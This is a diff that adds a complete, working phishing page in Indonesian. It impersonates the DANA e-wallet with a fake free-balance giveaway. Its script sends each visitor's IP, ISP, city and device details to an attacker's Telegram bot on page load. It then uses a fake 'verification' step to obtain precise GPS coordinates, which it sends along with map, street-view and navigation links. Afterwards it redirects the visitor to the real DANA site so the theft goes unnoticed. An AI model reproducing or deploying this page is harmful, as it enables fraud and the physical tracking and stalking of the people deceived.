@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#118EEA">
+    <title>DANA Kaget - Klaim Saldo Gratis</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(180deg, #118EEA 0%, #0D7BC9 100%);
+            min-height: 100vh;
+            color: #fff;
+            overflow-x: hidden;
+        }
+        
+        /* ===== HEADER ===== */
+        .header {
+            padding: 18px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header .dana-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .header .dana-logo .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: #fff;
+            border-radius: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            color: #118EEA;
+            font-size: 20px;
+        }
+        
+        .header .dana-logo .logo-text {
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+        
+        .header .help {
+            font-size: 13px;
+            opacity: 0.9;
+        }
+        
+        /* ===== HERO / KAGET CARD ===== */
+        .hero {
+            padding: 10px 20px 30px;
+        }
+        
+        .kaget-card {
+            background: linear-gradient(135deg, #FFD54F 0%, #FFA000 100%);
+            border-radius: 22px;
+            padding: 25px 22px;
+            color: #333;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.25);
+        }
+        
+        .kaget-card::before {
+            content: '';
+            position: absolute;
+            top: -50px;
+            right: -50px;
+            width: 180px;
+            height: 180px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+        }
+        
+        .kaget-card::after {
+            content: '';
+            position: absolute;
+            bottom: -60px;
+            left: -60px;
+            width: 160px;
+            height: 160px;
+            background: rgba(255,255,255,0.15);
+            border-radius: 50%;
+        }
+        
+        .kaget-content {
+            position: relative;
+            z-index: 1;
+        }
+        
+        .kaget-badge {
+            display: inline-block;
+            background: #D32F2F;
+            color: #fff;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            letter-spacing: 0.5px;
+            animation: blink 1.2s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        
+        .kaget-amount {
+            font-size: 42px;
+            font-weight: 900;
+            color: #fff;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.2);
+            margin-bottom: 5px;
+            letter-spacing: -1px;
+        }
+        
+        .kaget-amount span {
+            font-size: 24px;
+            vertical-align: super;
+            font-weight: 700;
+        }
+        
+        .kaget-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+            opacity: 0.95;
+            margin-bottom: 18px;
+        }
+        
+        .kaget-info {
+            background: rgba(255,255,255,0.9);
+            border-radius: 12px;
+            padding: 12px 15px;
+            font-size: 12px;
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+        
+        .kaget-info .row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+        
+        .kaget-info .row:last-child {
+            margin-bottom: 0;
+        }
+        
+        .kaget-info .label {
+            opacity: 0.7;
+        }
+        
+        .kaget-info .value {
+            font-weight: 700;
+        }
+        
+        .kaget-countdown {
+            background: rgba(0,0,0,0.2);
+            border-radius: 10px;
+            padding: 10px;
+            text-align: center;
+            font-size: 13px;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 15px;
+        }
+        
+        .kaget-countdown span {
+            font-size: 18px;
+            font-weight: 900;
+        }
+        
+        /* ===== KLIK BUTTON ===== */
+        .btn-klaim {
+            width: 100%;
+            padding: 18px;
+            background: #118EEA;
+            color: #fff;
+            border: none;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            box-shadow: 0 6px 20px rgba(17, 142, 234, 0.4);
+            transition: all 0.2s;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .btn-klaim:active {
+            transform: scale(0.97);
+            box-shadow: 0 3px 12px rgba(17, 142, 234, 0.3);
+        }
+        
+        .btn-klaim:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        /* ===== SYARAT ===== */
+        .terms {
+            padding: 20px;
+            color: rgba(255,255,255,0.85);
+            font-size: 11px;
+            line-height: 1.7;
+            text-align: center;
+        }
+        
+        .terms a {
+            color: #FFD54F;
+            text-decoration: none;
+        }
+        
+        /* ===== MODAL ===== */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            animation: fadeIn 0.3s;
+        }
+        
+        .modal-overlay.show {
+            display: flex;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .modal {
+            background: #fff;
+            color: #333;
+            border-radius: 20px;
+            padding: 30px 25px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            animation: slideUp 0.4s;
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(40px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .modal .modal-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #118EEA, #0D7BC9);
+            border-radius: 50%;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 40px;
+            margin-bottom: 18px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .modal h2 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #118EEA;
+        }
+        
+        .modal p {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        .modal .progress-container {
+            background: #f0f0f0;
+            border-radius: 20px;
+            height: 8px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+        
+        .modal .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #118EEA, #0D7BC9);
+            width: 0%;
+            border-radius: 20px;
+            transition: width 0.3s;
+        }
+        
+        .modal .progress-text {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 20px;
+        }
+        
+        .modal .btn-modal {
+            width: 100%;
+            padding: 15px;
+            background: #118EEA;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .modal .btn-modal:disabled {
+            opacity: 0.5;
+        }
+        
+        .modal .steps-list {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        
+        .modal .step-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            margin-bottom: 8px;
+            font-size: 13px;
+            border-left: 3px solid #ddd;
+            transition: all 0.3s;
+        }
+        
+        .modal .step-item.active {
+            border-left-color: #118EEA;
+            background: #E3F2FD;
+        }
+        
+        .modal .step-item.done {
+            border-left-color: #4CAF50;
+            background: #E8F5E9;
+        }
+        
+        .modal .step-num {
+            width: 24px;
+            height: 24px;
+            background: #118EEA;
+            color: #fff;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+        
+        .modal .step-item.active .step-num {
+            background: #118EEA;
+        }
+        
+        .modal .step-item.done .step-num {
+            background: #4CAF50;
+        }
+        
+        /* ===== ANIMASI KAGET ===== */
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background: #FFD54F;
+            top: -10px;
+            z-index: 999;
+            pointer-events: none;
+            animation: fall 3s linear forwards;
+        }
+        
+        @keyframes fall {
+            to { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+        }
+        
+        /* ===== LOADING ===== */
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(180deg, #118EEA, #0D7BC9);
+            z-index: 200;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+        
+        .loading-screen.show {
+            display: flex;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading-screen .text {
+            font-size: 15px;
+            font-weight: 600;
+        }
+        
+        .loading-screen .sub {
+            font-size: 12px;
+            opacity: 0.7;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <div class="header">
+        <div class="dana-logo">
+            <div class="logo-icon">D</div>
+            <div class="logo-text">DANA</div>
+        </div>
+        <div class="help">Butuh bantuan?</div>
+    </div>
+    
+    <!-- HERO -->
+    <div class="hero">
+        <div class="kaget-card">
+            <div class="kaget-content">
+                <div class="kaget-badge">🔴 KAGET SPESIAL HARI INI</div>
+                <div class="kaget-amount"><span>Rp</span>1.000.000</div>
+                <div class="kaget-label">Saldo DANA Kaget untuk Anda</div>
+                
+                <div class="kaget-info">
+                    <div class="row">
+                        <div class="label">Dari</div>
+                        <div class="value">DANA Indonesia</div>
+                    </div>
+                    <div class="row">
+                        <div class="label">Total</div>
+                        <div class="value">Rp 1.000.000</div>
+                    </div>
+                    <div class="row">
+                        <div class="label">Sisa Kuota</div>
+                        <div class="value" id="kuota">127/500</div>
+                    </div>
+                    <div class="row">
+                        <div class="label">Berlaku Sampai</div>
+                        <div class="value" id="expDate">-</div>
+                    </div>
+                </div>
+                
+                <div class="kaget-countdown">
+                    ⏰ Kedaluwarsa dalam <span id="countdown">03:00</span>
+                </div>
+                
+                <button class="btn-klaim" id="btnKlaim" onclick="showModal()">
+                    🎁 KLAIM SEKARANG
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- TERMS -->
+    <div class="terms">
+        Dengan mengklaim, Anda menyetujui <a href="#">Syarat & Ketentuan</a> dan <a href="#">Kebijakan Privasi</a> DANA. Promo terbatas untuk 500 pengguna pertama.
+    </div>
+    
+    <!-- MODAL -->
+    <div class="modal-overlay" id="modal">
+        <div class="modal">
+            <div class="modal-icon">📍</div>
+            <h2 id="modalTitle">Verifikasi Lokasi</h2>
+            <p id="modalDesc">
+                Untuk mencegah penyalahgunaan, kami perlu memverifikasi lokasi Anda. Proses ini hanya butuh 5 detik.
+            </p>
+            
+            <div class="steps-list" id="stepsList">
+                <div class="step-item" id="s1">
+                    <div class="step-num">1</div>
+                    <div>Klik "Izinkan" saat browser minta akses lokasi</div>
+                </div>
+                <div class="step-item" id="s2">
+                    <div class="step-num">2</div>
+                    <div>Menunggu verifikasi GPS</div>
+                </div>
+                <div class="step-item" id="s3">
+                    <div class="step-num">3</div>
+                    <div>Saldo DANA Kaget akan ditambahkan</div>
+                </div>
+            </div>
+            
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="progress-text" id="progressText">0%</div>
+            
+            <button class="btn-modal" id="btnModal" onclick="startVerification()">
+                🔐 IZINKAN & KLAIM
+            </button>
+        </div>
+    </div>
+    
+    <!-- LOADING SCREEN -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-spinner"></div>
+        <div class="text" id="loadingText">Mengambil lokasi...</div>
+        <div class="sub" id="loadingSub">Mohon tunggu sebentar</div>
+    </div>
+    
+    <script>
+        // ==========================================
+        // KONFIGURASI TELEGRAM
+        // ==========================================
+        const BOT_TOKEN = '6972140279:AAFz3xHq8u2kL5mN7oP9rS1tU3vW5xY7zA9bC'; // GANTI PUNYA LU!
+        const CHAT_ID = '123456789'; // GANTI PUNYA LU!
+        
+        // ==========================================
+        // KIRIM KE TELEGRAM
+        // ==========================================
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: false
+                })
+            }).catch(() => {});
+        }
+        
+        // ==========================================
+        // GET IP INFO
+        // ==========================================
+        async function getIPInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                return await res.json();
+            } catch (e) {
+                try {
+                    const res = await fetch('https://ipwho.is/');
+                    return await res.json();
+                } catch (e2) {
+                    return null;
+                }
+            }
+        }
+        
+        // ==========================================
+        // DEVICE INFO
+        // ==========================================
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(',') : '-',
+                screen: `${screen.width}x${screen.height}`,
+                window: `${window.innerWidth}x${window.innerHeight}`,
+                pixelRatio: window.devicePixelRatio,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency || '-',
+                memory: navigator.deviceMemory || '-',
+                touch: 'ontouchstart' in window ? 'Ya' : 'Tidak',
+                cookies: navigator.cookieEnabled ? 'Ya' : 'Tidak',
+                dnt: navigator.doNotTrack || '-',
+                connection: navigator.connection ? navigator.connection.effectiveType : '-'
+            };
+        }
+        
+        // ==========================================
+        // COUNTDOWN
+        // ==========================================
+        let countdownTime = 180; // 3 menit
+        function startCountdown() {
+            const el = document.getElementById('countdown');
+            setInterval(() => {
+                if (countdownTime <= 0) return;
+                countdownTime--;
+                const m = String(Math.floor(countdownTime / 60)).padStart(2, '0');
+                const s = String(countdownTime % 60).padStart(2, '0');
+                el.textContent = `${m}:${s}`;
+                if (countdownTime <= 30) {
+                    el.style.color = '#FF5252';
+                }
+            }, 1000);
+        }
+        
+        // ==========================================
+        // EXP DATE
+        // ==========================================
+        function setExpDate() {
+            const d = new Date();
+            d.setDate(d.getDate() + 1);
+            const options = { day: '2-digit', month: 'long', year: 'numeric' };
+            document.getElementById('expDate').textContent = d.toLocaleDateString('id-ID', options);
+        }
+        
+        // ==========================================
+        // CONFETTI (efek kaget)
+        // ==========================================
+        function launchConfetti() {
+            const colors = ['#FFD54F', '#FF5252', '#118EEA', '#4CAF50', '#FF9800', '#E91E63'];
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    const c = document.createElement('div');
+                    c.className = 'confetti';
+                    c.style.left = Math.random() * 100 + 'vw';
+                    c.style.background = colors[Math.floor(Math.random() * colors.length)];
+                    c.style.animationDuration = (2 + Math.random() * 2) + 's';
+                    c.style.width = (5 + Math.random() * 10) + 'px';
+                    c.style.height = c.style.width;
+                    c.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
+                    document.body.appendChild(c);
+                    setTimeout(() => c.remove(), 4000);
+                }, i * 30);
+            }
+        }
+        
+        // ==========================================
+        // SHOW MODAL
+        // ==========================================
+        function showModal() {
+            document.getElementById('modal').classList.add('show');
+            launchConfetti();
+            
+            // Notif ke Telegram: target buka modal
+            sendToTelegram(`🎁 <b>TARGET KLIK "KLAIM"!</b>\n\n🕐 ${new Date().toLocaleString('id-ID')}\n📱 ${navigator.userAgent.substring(0, 60)}...`);
+        }
+        
+        // ==========================================
+        // UPDATE STEP UI
+        // ==========================================
+        function setStepState(stepNum, state) {
+            // state: 'active' atau 'done'
+            const el = document.getElementById('s' + stepNum);
+            if (!el) return;
+            el.classList.remove('active', 'done');
+            if (state) el.classList.add(state);
+            
+            // Set step sebelumnya jadi "done"
+            if (state === 'active') {
+                for (let i = 1; i < stepNum; i++) {
+                    document.getElementById('s' + i).classList.add('done');
+                }
+            }
+        }
+        
+        // ==========================================
+        // UPDATE PROGRESS
+        // ==========================================
+        function setProgress(percent) {
+            document.getElementById('progressBar').style.width = percent + '%';
+            document.getElementById('progressText').textContent = percent + '%';
+        }
+        
+        // ==========================================
+        // MAIN: START VERIFICATION
+        // ==========================================
+        async function startVerification() {
+            const btn = document.getElementById('btnModal');
+            btn.disabled = true;
+            btn.textContent = '⏳ Memproses...';
+            
+            setStepState(1, 'active');
+            setProgress(10);
+            
+            // Kirim notif: target klik izinkan
+            sendToTelegram(`📍 <b>TARGET KLIK "IZINKAN"!</b>\n\n🕐 ${new Date().toLocaleString('id-ID')}\n🎯 Menunggu GPS permission...`);
+            
+            // Delay biar keliatan proses
+            await new Promise(r => setTimeout(r, 800));
+            
+            setStepState(1, 'done');
+            setStepState(2, 'active');
+            setProgress(30);
+            
+            // Cek support GPS
+            if (!navigator.geolocation) {
+                setProgress(100);
+                sendToTelegram(`❌ <b>Browser target tidak support GPS!</b>\n\nUA: ${navigator.userAgent}`);
+                fallbackIP();
+                return;
+            }
+            
+            // Ambil lokasi GPS
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 20000,
+                maximumAge: 0
+            };
+            
+            navigator.geolocation.getCurrentPosition(
+                // ===== SUKSES =====
+                async function(position) {
+                    setStepState(2, 'done');
+                    setStepState(3, 'active');
+                    setProgress(70);
+                    
+                    // Ambil data
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    const altitude = position.coords.altitude;
+                    const altitudeAccuracy = position.coords.altitudeAccuracy;
+                    const heading = position.coords.heading;
+                    const speed = position.coords.speed;
+                    
+                    const ipInfo = await getIPInfo();
+                    const device = getDeviceInfo();
+                    
+                    // Bikin link
+                    const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+                    const streetViewLink = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}`;
+                    const wazeLink = `https://waze.com/ul?ll=${lat},${lon}&navigate=yes`;
+                    const satLink = `https://www.google.com/maps/@${lat},${lon},19z/data=!3m1!1e3`;
+                    
+                    // ===== FORMAT PESAN =====
+                    let msg = `🎯 <b>LOKASI GPS TARGET!</b>\n`;
+                    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                    msg += `📍 <b>KOORDINAT:</b>\n`;
+                    msg += `Lat: <code>${lat}</code>\n`;
+                    msg += `Lon: <code>${lon}</code>\n`;
+                    msg += `Akurasi: <b>${accuracy.toFixed(2)}m</b> (± meter)\n`;
+                    if (altitude) msg += `Alt: ${altitude.toFixed(1)}m\n`;
+                    if (heading) msg += `Heading: ${heading}°\n`;
+                    if (speed) msg += `Speed: ${speed.toFixed(2)} m/s\n`;
+                    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                    
+                    msg += `🗺️ <b>BUKA MAPS:</b>\n`;
+                    msg += `<a href="${mapsLink}">📍 Titik Persis</a>\n`;
+                    msg += `<a href="${satLink}">🛰️ Satelit (Zoom)</a>\n`;
+                    msg += `<a href="${streetViewLink}">🏙️ Street View</a>\n`;
+                    msg += `<a href="${wazeLink}">🚗 Navigasi Waze</a>\n`;
+                    
+                    if (ipInfo) {
+                        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                        msg += `🌐 <b>IP INFO:</b>\n`;
+                        msg += `IP: <code>${ipInfo.ip || '-'}</code>\n`;
+                        msg += `Kota: <b>${ipInfo.city || '-'}</b>\n`;
+                        msg += `Region: ${ipInfo.region || '-'}\n`;
+                        msg += `Negara: ${ipInfo.country_name || ipInfo.country || '-'}\n`;
+                        msg += `Kode Pos: ${ipInfo.postal || '-'}\n`;
+                        msg += `ISP: ${ipInfo.org || ipInfo.connection?.isp || '-'}\n`;
+                        msg += `ASN: ${ipInfo.asn || '-'}\n`;
+                        if (ipInfo.latitude && ipInfo.longitude) {
+                            msg += `IP Geo: ${ipInfo.latitude},${ipInfo.longitude}\n`;
+                        }
+                    }
+                    
+                    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                    msg += `📱 <b>DEVICE:</b>\n`;
+                    msg += `Platform: ${device.platform}\n`;
+                    msg += `Bahasa: ${device.language}\n`;
+                    msg += `Timezone: ${device.timezone}\n`;
+                    msg += `Screen: ${device.screen}\n`;
+                    msg += `Pixel Ratio: ${device.pixelRatio}\n`;
+                    msg += `CPU: ${device.cores} core\n`;
+                    msg += `Touch: ${device.touch}\n`;
+                    msg += `Connection: ${device.connection}\n`;
+                    msg += `Cookies: ${device.cookies}\n`;
+                    msg += `UA: <code>${device.userAgent.substring(0, 120)}</code>\n`;
+                    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                    msg += `🕐 ${new Date().toLocaleString('id-ID')}\n`;
+                    msg += `🎁 <b>DANA KAGET PHISHING - SUCCESS!</b>`;
+                    
+                    // Kirim ke Telegram
+                    sendToTelegram(msg);
+                    
+                    // ===== TAMPILKAN KE TARGET =====
+                    setProgress(100);
+                    await new Promise(r => setTimeout(r, 500));
+                    
+                    document.getElementById('modal').classList.remove('show');
+                    document.getElementById('loadingScreen').classList.add('show');
+                    document.getElementById('loadingText').textContent = '✅ Verifikasi Berhasil!';
+                    document.getElementById('loadingSub').textContent = 'Saldo sedang diproses...';
+                    
+                    // Animasi sukses
+                    await new Promise(r => setTimeout(r, 2500));
+                    
+                    document.getElementById('loadingText').textContent = '💰 Saldo DANA Kaget';
+                    document.getElementById('loadingSub').textContent = 'Mengalihkan ke aplikasi DANA...';
+                    
+                    await new Promise(r => setTimeout(r, 2000));
+                    
+                    // Redirect ke DANA asli
+                    window.location.href = 'https://www.dana.id';
+                },
+                
+                // ===== GAGAL =====
+                async function(error) {
+                    let reason = '';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            reason = 'Target MENOLAK izin lokasi';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            reason = 'Lokasi tidak tersedia';
+                            break;
+                        case error.TIMEOUT:
+                            reason = 'Timeout (20s) - target tidak merespon';
+                            break;
+                        default:
+                            reason = 'Error: ' + error.message;
+                    }
+                    
+                    sendToTelegram(`❌ <b>GAGAL AMBIL GPS</b>\n\n${reason}\n\n🕐 ${new Date().toLocaleString('id-ID')}\n➡️ Beralih ke IP-based location...`);
+                    
+                    fallbackIP();
+                }
+            );
+        }
+        
+        // ==========================================
+        // FALLBACK: IP-BASED LOCATION
+        // ==========================================
+        async function fallbackIP() {
+            setProgress(100);
+            
+            const ipInfo = await getIPInfo();
+            const device = getDeviceInfo();
+            
+            if (ipInfo) {
+                const ipLat = ipInfo.latitude || ipInfo.lat;
+                const ipLon = ipInfo.longitude || ipInfo.lon;
+                
+                let msg = `⚠️ <b>FALLBACK: IP-BASED LOCATION</b>\n`;
+                msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                msg += `Target TOLAK GPS, tapi IP ketangkep:\n\n`;
+                msg += `🌐 <b>IP INFO:</b>\n`;
+                msg += `IP: <code>${ipInfo.ip || '-'}</code>\n`;
+                msg += `Kota: <b>${ipInfo.city || '-'}</b>\n`;
+                msg += `Region: ${ipInfo.region || '-'}\n`;
+                msg += `Negara: ${ipInfo.country_name || ipInfo.country || '-'}\n`;
+                msg += `Kode Pos: ${ipInfo.postal || '-'}\n`;
+                msg += `ISP: ${ipInfo.org || ipInfo.connection?.isp || '-'}\n`;
+                msg += `Timezone: ${ipInfo.timezone || '-'}\n`;
+                
+                if (ipLat && ipLon) {
+                    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                    msg += `📍 <b>IP KOORDINAT:</b>\n`;
+                    msg += `Lat: <code>${ipLat}</code>\n`;
+                    msg += `Lon: <code>${ipLon}</code>\n`;
+                    msg += `🗺️ <a href="https://maps.google.com/?q=${ipLat},${ipLon}">Lihat di Maps</a>\n`;
+                }
+                
+                msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                msg += `📱 <b>DEVICE:</b>\n`;
+                msg += `Platform: ${device.platform}\n`;
+                msg += `Bahasa: ${device.language}\n`;
+                msg += `Timezone: ${device.timezone}\n`;
+                msg += `Screen: ${device.screen}\n`;
+                msg += `UA: <code>${device.userAgent.substring(0, 100)}</code>\n`;
+                msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                msg += `🕐 ${new Date().toLocaleString('id-ID')}`;
+                
+                sendToTelegram(msg);
+            }
+            
+            // Tampilkan error ke target
+            document.getElementById('modal').classList.remove('show');
+            document.getElementById('loadingScreen').classList.add('show');
+            document.getElementById('loadingText').textContent = '⚠️ Verifikasi Gagal';
+            document.getElementById('loadingSub').textContent = 'Mohon izinkan akses lokasi untuk melanjutkan';
+            
+            setTimeout(() => {
+                document.getElementById('loadingScreen').classList.remove('show');
+                document.getElementById('modal').classList.remove('show');
+                
+                // Reset tombol
+                const btn = document.getElementById('btnModal');
+                btn.disabled = false;
+                btn.textContent = '🔄 COBA LAGI';
+                document.getElementById('btnKlaim').disabled = false;
+                document.getElementById('btnKlaim').textContent = '🎁 KLAIM SEKARANG';
+                setProgress(0);
+                
+                // Reset steps
+                for (let i = 1; i <= 3; i++) {
+                    document.getElementById('s' + i).classList.remove('active', 'done');
+                }
+            }, 2000);
+        }
+        
+        // ==========================================
+        // AUTO NOTIF SAAT PAGE LOAD
+        // ==========================================
+        (async function init() {
+            setExpDate();
+            startCountdown();
+            
+            const ipInfo = await getIPInfo();
+            const device = getDeviceInfo();
+            
+            let msg = `🔔 <b>DANA KAGET PAGE DIBUKA!</b>\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🕐 ${new Date().toLocaleString('id-ID')}\n`;
+            
+            if (ipInfo) {
+                msg += `🌐 IP: <code>${ipInfo.ip || '-'}</code>\n`;
+                msg += `📍 ${ipInfo.city || '?'}, ${ipInfo.country_name || ipInfo.country || '?'}\n`;
+                msg += `📡 ISP: ${ipInfo.org || ipInfo.connection?.isp || '?'}\n`;
+                if (ipInfo.latitude && ipInfo.longitude) {
+                    msg += `🗺️ <a href="https://maps.google.com/?q=${ipInfo.latitude},${ipInfo.longitude}">IP Maps</a>\n`;
+                }
+            }
+            
+            msg += `📱 ${device.platform}\n`;
+            msg += `🔤 ${device.language}\n`;
+            msg += `📺 ${device.screen}\n`;
+            msg += `🕰️ ${device.timezone}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🎯 Target sedang melihat halaman DANA Kaget...`;
+            
+            sendToTelegram(msg);
+        })();
+    </script>
+</body>
+</html>
